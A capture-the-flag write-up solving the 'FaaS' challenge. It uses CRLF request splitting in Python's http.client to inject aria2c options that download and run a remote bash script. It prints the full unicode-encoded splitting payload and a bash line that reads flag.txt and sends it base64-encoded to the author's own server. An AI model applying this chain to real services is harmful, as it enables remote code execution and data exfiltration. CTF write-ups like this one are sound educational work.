Welcome to your FaaS (Fetcher as a Service)!
This program allows you to fetch some stats on a given web url.

Current config is:
URL to fetch: http://insecurity-insa.fr
Fetcher options: {'timeout': 2, 'connect timeout': 2, 'max tries': 5, 'dry run': False}

Please choose your action:
  1. Change the default configuration of our fetcher
  2. Choose the URL you want us to inspect
  3. Fetch!
  4. Exit

Choice?
```

From the source code we can observe a lot of limitations:

* `url_to_fetch` must be valid JSON
* `url_to_fetch` when parsed with `urlparse` must return the http scheme, a valid host and a path
* `fetcher_options` is very limited and strictly controlled
* The outbound request is not made by the script itself but sent via POST to a Flask backend (but sources are not provided)

Also, by using the service we can get these other informations:

* No response content is ever returned, only statistical data, so we only know if the request was succesfull or not
* The Flask backend application use aria2 to perform the requests:

```bash
connect to [jbzserver] from ip-147-135-133.eu [147.135.133.206] 57218
GET / HTTP/1.1
User-Agent: aria2/1.19.0
Accept: */*,application/metalink4+xml,application/metalink+xml
Host: jbzserver:8080
````

`aria2` is a C language lightweight download manager which supports a lot of protocols and options.
It looks like the client script sends aria2 parameters and the destination url to the backend which then probably uses them via `subprocess`. Given the parametrization of the parameters they are probably used correctly (i.e.: no command injection with ;$() etc) so we should check `aria2` manual to see if there is any option that can be useful. However before looking into the command execution we need to find a way to send our custom parameters to tha backend.

From the source code:

```python
def fetch():
    # Hit local flask server
    conn = HTTPConnection(fetcher_service, 8888)
    options = []
    for conf in fetch_options.values():
        options.append(conf["key"] + "=" + str(conf["value"]).lower())
    params = bson.dumps({
        "options": options
    })
    conn.request("POST", "/?url=" + url_to_fetch, params)
    response = conn.getresponse()
    print("Stats:")
    print(response.read().decode())
    print()
```

As we can see they're not using python's `request` library but the raw `http.client`. Since `url_to_fetch` is appended without any particular sanitizations (aparte from being parse by `urlparse`) it's possible to inject CRLF to perform an HTTP request Splitting:
in practice we could add some newline characters we changing the `url_to_fetch` parameter and modify the request with our own body and headers. By controlling the `Content-Type` header we are able to force the backend server to discard the additional body added by the script.

By running the original script locally in order to test the vulnerability we can see that using `"http://jbz.com/ HTTP/1.1\r\nheader: splitting-test"` as a url the backend would receive the following request:

```bash
connect to [127.0.0.1] from localhost [127.0.0.1] 56362
POST /?url=http://jbz.com/ HTTP/1.1
header: splitting-test HTTP/1.1
Host: 127.0.0.1:8888
Accept-Encoding: identity
Content-Length: 109

moptions_0
          --timeout=21--connect-timeout=22--max-tries=53--dry-run=false

```

So the splitting does work.

However there's still a problem: the body of the request is being produced by the `bson.dumps` functions which hash a binary output which is not being encoded. Since our payload need to be loaded from the `url` config via the `json.loads` we can't directly send stuff like null bytes because JSON will fail. After a lot of testing we discovered that while `\x00` can't be used because it's a control character, it's unicode equivalent, `\u0000` is indeed valid.

The next step is to check the `aria2` manual to see if there are useful options:

From [the aria2c doc](http://aria2.github.io/manual/en/html/aria2c.html):

```bash
--on-download-complete=<COMMAND>

Set the command to be executed after download completed.
See See Event Hook for more details about COMMAND.
See also --on-download-stop option. Possible Values: /path/to/command
```

Let’s see an example of how arguments are passed to command:

``` bash
$ cat hook.sh
#!/bin/sh
echo "Called with [$1] [$2] [$3]"
$ aria2c --on-download-complete hook.sh http://example.org/file.iso
Called with [1] [1] [/path/to/file.iso]
```

The above options should help to achieve code execution but there are again limitations:

* `/path/to/command` needs the executable permissions which we cannot set
* The first argument of `/path/to/command` is the GID of the download

Luckly the GID of a download is random by default but it can be forced by the `--gid` option.
The following aria2c command succesfully execute the payload located at `http://jbzserver/a41b1d2f5a2c2da7`:

```bash
aria2c --on-download-complete=bash --gid=a41b1d2f5a2c2da7 http://jbzserver/a41b1d2f5a2c2da7 --dry-run=false
```

Here's the final payload prepared for the request splitting and unicode encoded:

```bash
"http://jbzserver:8080/a41b1d2f5a2c2da7 HTTP/1.1\r\nHost: localhost\r\nAccept-Encoding: identity\r\nContent-Length: 126\r\n\r\n\u007e\u0000\u0000\u0000\u0004\u006f\u0070\u0074\u0069\u006f\u006e\u0073\u0000\u0070\u0000\u0000\u0000\u0002\u0030\u0000\u0010\u0000\u0000\u0000\u002d\u002d\u0064\u0072\u0079\u002d\u0072\u0075\u006e\u003d\u0066\u0061\u006c\u0073\u0065\u0000\u0002\u0031\u0000\u001c\u0000\u0000\u0000\u002d\u002d\u006f\u006e\u002d\u0064\u006f\u0077\u006e\u006c\u006f\u0061\u0064\u002d\u0063\u006f\u006d\u0070\u006c\u0065\u0074\u0065\u003d\u0062\u0061\u0073\u0068\u0000\u0002\u0032\u0000\u000c\u0000\u0000\u0000\u002d\u002d\u0074\u0069\u006d\u0065\u006f\u0075\u0074\u003d\u0032\u0000\u0002\u0033\u0000\u0017\u0000\u0000\u0000\u002d\u002d\u0067\u0069\u0064\u003d\u0061\u0034\u0031\u0062\u0031\u0064\u0032\u0066\u0035\u0061\u0032\u0063\u0032\u0064\u0061\u0037\u0000\u0000\u0000\r\n\r\n"
```

For completeness, here's the payload:

```bash
#!/bin/bash
aria2c http://jbzserver:8080/?resp=$(cat flag.txt | base64 | tr -d '\n')
```

```bash

The flag was `INSA{wrong_libs_combination?_or_bad_programmer?}`.
